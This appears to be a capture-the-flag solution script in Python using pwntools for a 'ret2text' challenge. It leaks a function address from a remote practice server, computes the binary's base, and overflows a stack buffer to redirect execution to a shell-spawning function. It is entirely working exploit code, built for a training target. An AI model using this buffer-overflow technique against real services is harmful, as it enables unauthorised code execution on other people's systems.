from pwn import *

# p = process("./ret2text")
p = remote("node7.anna.nssctf.cn",27538)
p.recvuntil("0x")
main = int(p.recv(8),16)
elf_base = main-0x770
shell = elf_base+0x818
payload = b"a"*0x2c + p32(shell)  

#p.sendlineafter("Please input the length of your name:\n",str(100))
#p.sendlineafter("[+]What's u name?\n",payload)
p.sendline(payload)

p.interactive()